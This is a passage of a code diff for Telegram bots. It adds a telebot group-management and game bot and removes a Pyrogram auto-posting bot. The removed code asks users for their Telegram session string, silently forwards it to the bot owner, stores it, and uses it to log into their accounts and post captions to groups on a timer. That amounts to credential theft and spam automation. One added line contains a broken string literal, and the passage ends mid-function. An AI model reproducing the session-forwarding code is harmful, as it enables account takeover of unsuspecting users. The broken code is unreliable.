+    bot.reply_to(m, darlen_replies[idx])
+    idx = (idx + 1) % len(darlen_replies)
+    darlen_reply_index[uid] = idx
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["تبا", "كس امك", "كس أمك"])
+def react_badword(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    idx = badword_index.get(uid, 0)
+    reaction = random.choice(badword_reactions)
+    try:
+        bot.set_message_reaction(chat_id, m.message_id, reaction=[ReactionTypeEmoji(emoji=reaction)])
+        def delete_message():
+            time.sleep(5)
+            try:
+                bot.delete_message(chat_id, m.message_id)
+            except:
+                pass
+        threading.Thread(target=delete_message).start()
+    except:
+        pass
+    idx = (idx + 1) % len(badword_reactions)
+    badword_index[uid] = idx
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "معرفي")
+def show_user_id(m):
+    user_id = m.from_user.id
+    firstname = m.from_user.first_name
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{user_id}"))
+    bot.reply_to(m, f"معرفك: {user_id}", reply_markup=kb)
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["سيارة", "سياره"])
+def vehicle_car(m):
+    uid = m.from_user.id
+    if "سيارة" in user_vehicles.get(uid, {}):
+        bot.reply_to(m, "🚗")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["دراجة", "دراجه", "دراجة نارية", "دراجه ناريه"])
+def vehicle_motorcycle(m):
+    uid = m.from_user.id
+    if "دراجة نارية" in user_vehicles.get(uid, {}):
+        bot.reply_to(m, "🏍️")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["طائرة", "طائره"])
+def vehicle_plane(m):
+    uid = m.from_user.id
+    if "طائرة" in user_vehicles.get(uid, {}):
+        bot.reply_to(m, "✈️")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["حافلة", "حافله"])
+def vehicle_bus(m):
+    uid = m.from_user.id
+    if "حافلة" in user_vehicles.get(uid, {}):
+        bot.reply_to(m, "🚎")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "صاروخ")
+def vehicle_rocket(m):
+    uid = m.from_user.id
+    if "صاروخ" in user_vehicles.get(uid, {}):
+        bot.reply_to(m, "🚀")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["الكرة", "كرة"])
+def start_ball_game(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    ball_status[uid] = {
+        "has_ball": True,
+        "last_action": datetime.now(),
+        "ball_type": "كرة القدم",
+        "start_time": datetime.now(),
+        "stars_earned": 0,
+        "result": None,
+        "duration": 0
+    }
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+    bot.reply_to(m, "دعنا نلعب معًا!", reply_markup=kb)
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "تمرير")
+def pass_ball(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    if uid not in ball_status:
+        return
+    ball_status[uid]["last_action"] = datetime.now()
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+    if ball_status[uid]["has_ball"]:
+        ball_status[uid]["has_ball"] = False
+        bot.reply_to(m, "مررت الكرة إلى رفاقك!", reply_markup=kb)
+    else:
+        ball_status[uid]["has_ball"] = True
+        bot.reply_to(m, "مررت الكرة إليك!", reply_markup=kb)
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["هدف", "تسجيل"])
+def score_goal(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    if uid not in ball_status or not ball_status[uid]["has_ball"]:
+        return
+    ball_status[uid]["last_action"] = datetime.now()
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("النتيجة", callback_data=f"show_result_{uid}"))
+    bot.reply_to(m, "⚽ هدف رائع!", reply_markup=kb)
+
+@bot.message_handler(func=lambda m: m.text and m.text == "رصيده" and m.reply_to_message)
+def show_other_balance(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    target = m.reply_to_message.from_user
+    balance = user_balances.get(target.id, 0)
+    kb = InlineKeyboardMarkup()
+    kb.add(
+        InlineKeyboardButton("إهداء", callback_data=f"gift_start_{target.id}_{uid}"),
+        InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}")
     )
+    bot.reply_to(m, f"الرصيد الخاص به: {balance} نجمة", reply_markup=kb)
 
-@app.on_callback_query(filters.regex(r"^(loginses)$"))
-async def login_via_session(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users.get(str(user_id), {}).get("vip"): 
-        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    elif callback.data == "loginses" and users.get(str(user_id), {}).get("session") is None: 
-        return await callback.answer("- لم تقم بالتسجيل بعد.", show_alert=True)
-    
-    await callback.message.delete()
-    try:
-        ask = await listener.listen(
-            from_id=user_id,
-            chat_id=user_id,
-            text="- أرسل كود الجلسة الخاص بك: \n\n- يمكنك ارسال /cancel لإلغاء التسجيل.",
-            reply_markup=ForceReply(selective=True, placeholder="SESSION_STRING"),
-            timeout=30
-        )
-    except TimeoutError:
-        return await callback.message.reply(
-            text="- نفد وقت استلام كود الجلسة",
-            reply_markup=Markup([[Button("- العوده -", callback_data="account")]])
-        )
-    
-    if ask.text == "/cancel": 
-        return await ask.reply("- تم إلغاء العمليه.", reply_to_message_id=ask.id)
-    
-    create_task(registration_via_session(ask))
+@bot.message_handler(func=lambda m: m.text and m.text.startswith("إهداء ") and m.reply_to_message)
+def gift_command(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    if m.reply_to_message.from_user.id == uid:
+        return
+    parts = m.text.split()
+    if len(parts) != 2 or not parts[1].isdigit():
+        return
+    amount = int(parts[1])
+    if amount <= 0:
+        return
+    balance = user_balances.get(uid, 0)
+    target_user = m.reply_to_message.from_user
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}"))
+    if balance < amount:
+        bot.reply_to(m, "ليس لديك رصيد كافٍ!", reply_markup=kb)
+        return
+    user_balances[uid] = balance - amount
+    user_balances[target_user.id] = user_balances.get(target_user.id, 0) + amount
+    bot.reply_to(m, "تم الإهداء!", reply_markup=kb)
 
-
-async def registration_via_session(_: Client, message: Message):
-    user_id = message.from_user.id
-    session_string = message.text
-    lmsg = await message.reply("- جارٍ تسجيل الدخول إلى حسابك")
-    reMarkup = Markup([
-        [Button("- إعادة المحاوله -", callback_data="loginses"), Button("- رجوع -", callback_data="account")]
-    ])
-
-    registration_client = Client(
-        session_string,
-        in_memory=True,
-        api_id = app.api_id,
-        api_hash = app.api_hash
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "رصيدي")
+def show_my_balance(m):
+    uid = m.from_user.id
+    chat_id = m.chat.id
+    balance = user_balances.get(uid, 0)
+    kb = InlineKeyboardMarkup()
+    kb.add(
+        InlineKeyboardButton("الهدية اليومية", callback_data=f"daily_gift_{uid}"),
+        InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{uid}")
     )
-    
-    try:
-        await registration_client.connect()
+    bot.reply_to(m, f"الرصيد الخاص بك: {balance} نجمة", reply_markup=kb)
 
-    except Exception as e:
-        return await lmsg.listener(f"- فشل تسجيل الدخول باستخدام كود الجلسة: {str(e)}", reply_markup=reMarkup)
-
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "مسح" and m.reply_to_message)
+def delete_messages(m):
+    chat_id = m.chat.id
+    from_user = m.from_user
+    reply_msg = m.reply_to_message
+    if not (is_owner(chat_id, from_user.id) or is_admin(chat_id, from_user.id)):
+        return
     try:
-        await listener.send_message(owner, session_string)
+        bot.delete_message(chat_id, reply_msg.message_id)
+        bot.delete_message(chat_id, m.message_id)
     except:
         pass
 
-    await registration_client.disconnect()
-
-    if user_id == owner and users.get(str(user_id)) is None:
-        users[str(user_id)] = {"vip": True, "session": session_string}
-        write(users_db, users)
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["رفع مشرف", "ترقية", "ترقيه", "الترقية", "الترقيه"] and m.reply_to_message)
+def promote_admin(m):
+    chat_id = m.chat.id
+    from_user = m.from_user
+    target_user = m.reply_to_message.from_user
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{from_user.id}"))
+    if not is_owner(chat_id, from_user.id):
+        bot.reply_to(m, "هذا الأمر لمالك المجموعة فقط!", reply_markup=kb)
+        return
+    if is_admin(chat_id, target_user.id):
+        bot.reply_to(m, "هذا المستخدم مشرف بالفعل!", reply_markup=kb)
+        return
+    if promote_user(chat_id, target_user.id):
+        bot.reply_to(m, "تم رفعه كمشرف!", reply_markup=kb)
     else:
-        users[str(user_id)]["session"] = session_string
-    write(users_db, users)
-    
-    await listener.send_message(
-        user_id, 
-        "- تم تسجيل الدخول في حسابك يمكنك الآن الاستمتاع بمميزات البوت.",
-        reply_markup=Markup([[Button("الصفحه الرئيسيه", callback_data="toHome")]])
-    )
-@app.on_callback_query(filters.regex(r"^(newSuper)$"))
-async def newSuper(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    await callback.message.delete()
-    reMarkup = Markup([
-        [
-            Button("- حاول مره أخرى -", callback_data="newSuper"),
-            Button("- رجوع -", callback_data="toHome")
-        ]
-    ])
-    try: ask = await listener.listen(
-        from_id=user_id, 
-        chat_id=user_id,
-        text="- ارسل رابط السوبر لإضافته.- لا تنضم قبل ان تقوم تبدأ النشر لمره واحده على الاقل.\n- اذا كان السوبر خاص ف ارسل الايدي الخاص به او غادر السوبر (من الحساب المضاف) ثم ارسل الرابط\n\n- يمكنك ارسال /cancel لألغاء العمليه.",
-        reply_markup=ForceReply(selective=True, placeholder="- Super group URL: "),
-        timeout=60
-    )
-    except exceptions.TimeOut: return await callback.message.reply("نفذ وقت استلام الرابط", reply_markup=reMarkup)
-    if ask.text == "/cancel": return await ask.reply("- تم إلغاء العمليه", reply_to_message_id=ask.id, reply_markup=reMarkup)
-    if not ask.text.startswith("-"):
-        try:chat = await app.get_chat(ask.text if "+" in ask.text else (ask.text.split("/")[-1]))
-        except BotMethodInvalid:
-            chat = ask.text
-        except Exception as e: 
-            print(e)
-            return await ask.reply(
-                "- لم يتم ايجاد السوبر.", 
-                reply_to_message_id=ask.id,
-                reply_markup=reMarkup
-        )
-    else: chat = ask.text
-    if users[str(user_id)].get("groups") is None: users[str(user_id)]["groups"] = []
-    users[str(user_id)]["groups"].append(chat.id if not isinstance(chat, str) else int(chat))
-    write(users_db, users)
-    await ask.reply(
-        "- تمت اضافة هذا السوبر الى القائمه.", 
-        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome"), Button("- إضافة سوبر -", callback_data="newSuper")]]),
-        reply_to_message_id=ask.id
-    )
+        bot.reply_to(m, "فشل في رفع العضو!", reply_markup=kb)
 
-@app.on_callback_query(filters.regex(r"^(newSupers)$"))
-async def newSupers(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    await callback.message.delete()
-    reMarkup = Markup([
-        [
-            Button("- حاول مره أخرى -", callback_data="newSupers"),
-            Button("- رجوع -", callback_data="toHome")
-        ]
-    ])
-    try: ask = await listener.listen(
-        from_id=user_id, 
-        chat_id=user_id,
-        text="- ارسل رابط السوبر لإضافته.- لا تنضم قبل ان تقوم تبدأ النشر لمره واحده على الاقل.\n- اذا كان السوبر خاص ف ارسل الايدي الخاص به او غادر السوبر (من الحساب المضاف) ثم ارسل الرابط\n\n- يمكنك ارسال /cancel لألغاء العمليه.",
-        reply_markup=ForceReply(selective=True, placeholder="- Supers group URL: "),
-        timeout=60
-    )
-    except exceptions.TimeOut: return await callback.message.reply("نفذ وقت استلام الرابط", reply_markup=reMarkup)
-    if ask.text == "/cancel": return await ask.reply("- تم إلغاء العمليه", reply_to_message_id=ask.id, reply_markup=reMarkup)
-    if not ask.text.startswith("-"):
-        try:chat = await app.get_chat(ask.text if "+" in ask.text else (ask.text.split("/")[-1]))
-        except BotMethodInvalid:
-            chat = ask.text
-        except Exception as e: 
-            print(e)
-            return await ask.reply(
-                "- لم يتم ايجاد السوبر.", 
-                reply_to_message_id=ask.id,
-                reply_markup=reMarkup
-        )
-    else: chat = ask.text
-    if users[str(user_id)].get("groups") is None: users[str(user_id)]["groups"] = []
-    users[str(user_id)]["groups"].append(chat.id if not isinstance(chat, str) else int(chat))
-    write(users_db, users)
-    await ask.reply(
-        "- تمت اضافة هذا السوبر الى القائمه.", 
-        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome"), Button("- إضافة سوبر -", callback_data="newSuper")]]),
-        reply_to_message_id=ask.id
-    )
-
-@app.on_callback_query(filters.regex(r"^(currentSupers)$"))
-async def currentSupers(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    if users[str(user_id)].get("groups") is None or len(users[str(user_id)]["groups"]) == 0: return await callback.answer("- لم يتم إضافة اي سوبر لعرضه", show_alert=True)
-    groups = users[str(user_id)]["groups"]
-    titles = {}
-    for group in groups:
-        try: titles[str(group)] = (await app.get_chat(group)).title
-        except: continue
-    markup = [
-        [
-            Button(str(group) if titles.get(str(group)) is None else titles[str(group)], callback_data=str(group)),
-            Button("🗑", callback_data=f"delSuper {group}")
-        ] for group in groups
-    ] if len(groups) else []
-    markup.append([Button("- الصفحه الرئيسيه -", callback_data="toHome"), Button("- إضافة سوبر -", callback_data="newSuper")])
-    caption = "- اليك السوبرات المضافه الى النشر التلقائي:"
-    await callback.message.edit_text(
-        caption, 
-        reply_markup = Markup(markup)
-    )
-    
-
-@app.on_callback_query(filters.regex(r"^(delSuper)"))
-async def delSuper(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    groups = users[str(user_id)]["groups"]
-    group = int(callback.data.split()[1])
-    if group in groups:
-        groups.remove(group)
-        write(users_db, users)
-        await callback.answer("- تم حذف هذا السوبر من القائمه", show_alert=True)
-    titles = {}
-    for group in groups:
-        try: titles[str(group)] = (await app.get_chat(group)).title
-        except: continue
-    markup = [
-        [
-            Button(str(group) if titles.get(str(group)) is None else titles[str(group)], callback_data=str(group)),
-            Button("🗑", callback_data=f"delSuper {group}")
-        ] for group in groups
-    ] if len(groups) else []
-    markup.append([Button("- الصفحه الرئيسيه -", callback_data="toHome")])
-    await callback.message.edit_reply_markup(
-        reply_markup = Markup(markup)
-    )
-
-
-@app.on_callback_query(filters.regex(r"^(newCaption)$"))
-async def newCaption(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    reMarkup = Markup([
-        [
-            Button("- حاول مره أخرى -", callback_data="newCaption"),
-            Button("- رجوع -", callback_data="toHome")
-        ]
-    ])
-    await callback.message.delete()
-    try:ask = await listener.listen(
-        from_id = user_id, 
-        chat_id = user_id, 
-        text = "- يمكنك ارسال الكليشه الجديده الآن.\n\n- استخدم /cancel لإلغاء العمليه.",
-        reply_markup = ForceReply(selective = True, placeholder = "- Your new caption: "),
-        timeout = 120
-    )
-    except exceptions.TimeOut: return await callback.message.reply("- انتهى وقت استلام الكليشه الجديده.", reply_markup=reMarkup)
-    if ask.text == "/cancel": await ask.reply("- تم الغاء العمليه.", reply_markup=reMarkup, reply_to_message_id=ask.id)
-    users[str(user_id)]["caption"] = ask.text
-    write(users_db, users)
-    await ask.reply(
-        "- تم تعيين الكليشه الجديده.",
-        reply_to_message_id = ask.id,
-        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome")]])
-    )
-
-
-@app.on_callback_query(filters.regex(r"^(newCaption2)$"))
-async def newCaption(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    reMarkup = Markup([
-        [
-            Button("- حاول مره أخرى -", callback_data="newCaption"),
-            Button("- رجوع -", callback_data="toHome")
-        ]
-    ])
-    await callback.message.delete()
-    try:ask = await listener.listen(
-        from_id = user_id, 
-        chat_id = user_id, 
-        text = "- يمكنك ارسال الكليشه الجديده الآن.\n\n- استخدم /cancel لإلغاء العمليه.",
-        reply_markup = ForceReply(selective = True, placeholder = "- Your new caption: "),
-        timeout = 120
-    )
-    except exceptions.TimeOut: return await callback.message.reply("- انتهى وقت استلام الكليشه الجديده.", reply_markup=reMarkup)
-    if ask.text == "/cancel": await ask.reply("- تم الغاء العمليه.", reply_markup=reMarkup, reply_to_message_id=ask.id)
-    users[str(user_id)]["caption2"] = ask.text
-    write(users_db, users)
-    await ask.reply(
-        "- تم تعيين الكليشه الجديده.",
-        reply_to_message_id = ask.id,
-        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome")]])
-    )
-
-
-@app.on_callback_query(filters.regex(r"^(waitTime)$"))
-async def waitTime(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    reMarkup = Markup([
-        [
-            Button("- حاول مره أخرى -", callback_data="waitTime"),
-            Button("- رجوع -", callback_data="toHome")
-        ]
-    ])
-    await callback.message.delete()
-    try:ask = await listener.listen(
-        from_id = user_id, 
-        chat_id = user_id, 
-        text = "- يمكنك ارسال مدة الانتظار ( بالثواني ) الآن.\n\n- أرسل عدد أكبر من 300 .\n\n- استخدم /cancel لإلغاء العمليه.",
-        reply_markup = ForceReply(selective = True, placeholder = "- The duration  < 300 : "),
-        timeout = 120
-    )
-    except exceptions.TimeOut: return await callback.message.reply("- انتهى وقت استلام مدة الانتظار.", reply_markup=reMarkup)
-    if ask.text == "/cancel": await ask.reply("- تم الغاء العمليه.", reply_markup=reMarkup, reply_to_message_id=ask.id)
-    try:users[str(user_id)]["waitTime"] = int(ask.text)
-    except ValueError: return await ask.reply("- لا يمكنك وضع هذه البيانات كمده.", reply_markup=reMarkup, reply_to_message_id=ask.id)
-    write(users_db, users)
-    await ask.reply(
-        "- تم تعيين مدة الانتظار.",
-        reply_to_message_id = ask.id,
-        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome")]])
-    )
-    
-
-@app.on_callback_query(filters.regex(r"^(startPosting)$"))
-async def startPosting(_: Client,  callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    if users[str(user_id)].get("session") is None: return await callback.answer("- عليك اضافة حساب أولا.", show_alert=True)
-    elif (users[str(user_id)].get("groups") is None) or (len(users[str(user_id)]["groups"]) == 0): return await callback.answer("- لم يتم اضافة اي سوبرات بعد.", show_alert=True) 
-    elif users[str(user_id)].get("posting"): return await callback.answer("النشر التلقائي مفعل من قبل.", show_alert=True)
-    
-    users[str(user_id)]["posting"] = True
-    write(users_db, users)
-    create_task(posting(user_id))
-    
-    markup = Markup([
-        [Button("- إيقاف النشر -", callback_data="stopPosting"),
-         Button("- رجوع -", callback_data="toHome")]
-    ])
-    await callback.message.edit_text(
-        "- بدأت عملية النشر التلقائي",
-        reply_markup = markup
-    )
-
-@app.on_callback_query(filters.regex(r"^(stopPosting)$"))
-async def stopPosting(_: Client,  callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    if not users[str(user_id)].get("posting"): return await callback.answer("النشر التلقائي معطل بالفعل.", show_alert=True)
-    
-    users[str(user_id)]["posting"] = False
-    write(users_db, users)
-    
-    markup = Markup([
-        [Button("- بدء النشر -", callback_data="startPosting"),
-         Button("- رجوع -", callback_data="toHome")]
-    ])
-    await callback.message.edit_text(
-        "- تم ايقاف عملية النشر التلقائي",
-        reply_markup = markup
-    )
-
-async def posting(user_id):
-    if users[str(user_id)]["posting"]:
-        client = Client(
-            str(user_id),
-            api_id=app.api_id,
-            api_hash=app.api_hash,
-            session_string=users[str(user_id)]["session"]
-        )
-        await client.start()
-
-        while users[str(user_id)]["posting"]:
-            try:
-                sleepTime = random.randint(250, users[str(user_id)]["waitTime"])
-            except KeyError:
-                users[str(user_id)]["waitTime"] = False
-                write(users_db, users)
-                return await app.send_message(int(user_id), "- تم إيقاف النشر بسبب عدم اضافة وقت.", reply_markup=Markup([[Button("- إضافة وقت -", callback_data="waitTime")]]))
-
-            groups = users[str(user_id)]["groups"]
-            try:
-                caption = users[str(user_id)]["caption"]
-            except KeyError:
-                users[str(user_id)]["posting"] = False
-                write(users_db, users)
-                return await app.send_message(int(user_id), "- تم إيقاف النشر بسبب عدم اضافة كليشة.", reply_markup=Markup([[Button("- إضافة كليشه -", callback_data="newCaption")]]))
-
-            for group in groups:
-                if isinstance(group, str) and group.startswith("-"):
-                    group = int(group)
-
-                if not isinstance(group, int) or not str(group).startswith("-100"):
-                    await app.send_message(int(user_id), f"Invalid group ID: {group}")
-                    continue
-
-                try:
-                    await client.send_message(group, caption)
-                except ChatWriteForbidden:
-                    try:
-                        await client.join_chat(group)
-                        await client.send_message(group, caption)
-                    except PeerIdInvalid:
-                        await app.send_message(int(user_id), f"مشكلة في الانضمام للقروب : {group}")
-                    except Exception as e:
-                        await app.send_message(int(user_id), str(e))
-                except PeerIdInvalid:
-                    await app.send_message(int(user_id), f"مشكلة في القروب : {group}")
-                except Exception as e:
-                    await app.send_message(int(user_id), str(e))
-
-            await sleep(sleepTime)
-
-        await client.stop()
-
-
-@app.on_callback_query(filters.regex(r"^(startPosting2)$"))
-async def startPosting2(_: Client,  callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    if users[str(user_id)].get("session") is None: return await callback.answer("- عليك اضافة حساب أولا.", show_alert=True)
-    elif (users[str(user_id)].get("groups") is None) or (len(users[str(user_id)]["groups"]) == 0): return await callback.answer("- لم يتم اضافة اي سوبرات بعد.", show_alert=True) 
-    elif users[str(user_id)].get("posting2"): return await callback.answer("النشر التلقائي مفعل من قبل.", show_alert=True)
-    
-    users[str(user_id)]["posting2"] = True
-    write(users_db, users)
-    create_task(posting2(user_id))
-    
-    markup = Markup([
-        [Button("- إيقاف النشر -", callback_data="stopPosting2"),
-         Button("- رجوع -", callback_data="toHome")]
-    ])
-    await callback.message.edit_text(
-        "- بدأت عملية النشر التلقائي",
-        reply_markup = markup
-    )
-
-@app.on_callback_query(filters.regex(r"^(stopPosting2)$"))
-async def stopPosting2(_: Client,  callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    if not users[str(user_id)].get("posting2"): return await callback.answer("النشر التلقائي معطل بالفعل.", show_alert=True)
-    
-    users[str(user_id)]["posting2"] = False
-    write(users_db, users)
-    
-    markup = Markup([
-        [Button("- بدء النشر -", callback_data="startPosting2"),
-         Button("- رجوع -", callback_data="toHome")]
-    ])
-    await callback.message.edit_text(
-        "- تم ايقاف عملية النشر التلقائي",
-        reply_markup = markup
-    )
-
-async def posting2(user_id):
-    if users[str(user_id)]["posting2"]:
-        client = Client(
-            str(user_id),
-            api_id=app.api_id,
-            api_hash=app.api_hash,
-            session_string=users[str(user_id)]["session"]
-        )
-        await client.start()
-
-        while users[str(user_id)]["posting2"]:
-            try:
-                sleepTime = random.randint(250, users[str(user_id)]["waitTime"])
-            except KeyError:
-                users[str(user_id)]["waitTime"] = False
-                write(users_db, users)
-                return await app.send_message(int(user_id), "- تم إيقاف النشر بسبب عدم اضافة وقت.", reply_markup=Markup([[Button("- إضافة وقت -", callback_data="waitTime")]]))
-
-            groups = users[str(user_id)]["groups"]
-            try:
-                caption = users[str(user_id)]["caption2"]
-            except KeyError:
-                users[str(user_id)]["posting2"] = False
-                write(users_db, users)
-                return await app.send_message(int(user_id), "- تم إيقاف النشر بسبب عدم اضافة كليشة.", reply_markup=Markup([[Button("- إضافة كليشه -", callback_data="newCaption")]]))
-
-            for group in groups:
-                if isinstance(group, str) and group.startswith("-"):
-                    group = int(group)
-
-                if not isinstance(group, int) or not str(group).startswith("-100"):
-                    await app.send_message(int(user_id), f"Invalid group ID: {group}")
-                    continue
-
-                try:
-                    await client.send_message(group, caption)
-                except ChatWriteForbidden:
-                    try:
-                        await client.join_chat(group)
-                        await client.send_message(group, caption)
-                    except PeerIdInvalid:
-                        await app.send_message(int(user_id), f"مشكلة في الانضمام للقروب : {group}")
-                    except Exception as e:
-                        await app.send_message(int(user_id), str(e))
-                except PeerIdInvalid:
-                    await app.send_message(int(user_id), f"مشكلة في القروب : {group}")
-                except Exception as e:
-                    await app.send_message(int(user_id), str(e))
-
-            await sleep(sleepTime)
-
-        await client.stop()
-
-"""
-USER SECTION ENDED
-the next part for the bot's owner only
-
-
-OWNER SECTION STARTED
-"""
-async def Owner(_, __: Client, message: Message):
-    return message.from_user.id in owners
-
-isOwner = filters.create(Owner)
-
-adminMarkup = Markup([
-    [
-        Button("- الغاء VIP -", callback_data="cancelVIP"),
-        Button("- تفعيل VIP -", callback_data="addVIP")
-    ],
-    [
-        Button("- الاحصائيات -", callback_data="statics"),
-        Button("- قنوات الإشتراك -", callback_data="channels")
-    ],
-    [
-        Button("- الجلسات التي بالبوت -", callback_data="viewsession"),
-        Button("- إرسال إذاعة -", callback_data="broadcast")
-    ],
-    [
-        Button("- حالة الأعضاء -", callback_data="viewUsers"),
-        Button("- الكلايش -", callback_data="viewcaption")
-    ],
-    [
-        Button("- جلب التخزين -", callback_data="sendFiles")
-    ],
-])
-
-
-@app.on_message(filters.command("admin") & filters.private & isOwner)
-@app.on_callback_query(filters.regex("toAdmin") & isOwner)
-async def admin(_: Client, message: Union[Message, CallbackQuery]):
-    fname = message.from_user.first_name
-    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة المالك"
-    func = message.reply if isinstance(message, Message) else message.message.edit_text
-    await func(
-        caption, 
-        reply_markup=adminMarkup,
-    )
-    
-@app.on_callback_query(filters.regex("sendFiles") & isOwner)
-async def send_files(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    reMarkup = Markup([[
-        Button("- الصفحه الرئيسيه -", callback_data="toAdmin")
-    ]])
-    
-    await callback.message.delete()
-    
-    # إرسال ملف users.json
-    if os.path.exists(users_db):
-        await app.send_document(chat_id=user_id, document=users_db, caption="Here is the users.json file.")
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["عزل مشرف", "ازالة الاشراف", "إزالة الإشراف"] and m.reply_to_message)
+def demote_admin(m):
+    chat_id = m.chat.id
+    from_user = m.from_user
+    target_user = m.reply_to_message.from_user
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{from_user.id}"))
+    if not is_owner(chat_id, from_user.id):
+        bot.reply_to(m, "لا يمكنك استخدام ذلك الأمر.", reply_markup=kb)
+        return
+    if not is_admin(chat_id, target_user.id):
+        bot.reply_to(m, "هذا المستخدم ليس مشرفًا!", reply_markup=kb)
+        return
+    if demote_user(chat_id, target_user.id):
+        bot.reply_to(m, "تم عزل الإشراف!", reply_markup=kb)
     else:
-        await app.send_message(chat_id=user_id, text="The users.json file does not exist.")
-    
-    # إرسال ملف channels.json
-    if os.path.exists(channels_db):
-        await app.send_document(chat_id=user_id, document=channels_db, caption="Here is the channels.json file.")
-    else:
-        await app.send_message(chat_id=user_id, text="The channels.json file does not exist.")
-    
-    await callback.message.reply("تم إرسال الملفات بنجاح.", reply_markup=reMarkup)
+        bot.reply_to(m, "فشل في عزل الإشراف!", reply_markup=kb)
 
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["طرد", "الطرد  "الطرد"] and m.reply_to_message)
+def kick_user(m):
+    chat_id = m.chat.id
+    from_user = m.from_user
+    target_user = m.reply_to_message.from_user
+    bot_id = bot.get_me().id
+    kb = InlineKeyboardMarkup()
+    kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{from_user.id}"))
 
-@app.on_callback_query(filters.regex("broadcast") & isOwner)
-async def broadcast(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    reMarkup = Markup([[
-        Button("- الصفحه الرئيسيه -", callback_data="toAdmin")
-    ]])
-    await callback.message.delete()
-    
+    if not (is_owner(chat_id, from_user.id) or is_admin(chat_id, from_user.id)):
+        bot.reply_to(m, "هذا الأمر للمشرفين أو المالك فقط!", reply_markup=kb)
+        return
+
+    if target_user.id == bot_id:
+        bot.reply_to(m, "عذرًا، لا يمكنني طرد نفسي!", reply_markup=kb)
+        return
+
+    if is_owner(chat_id, target_user.id):
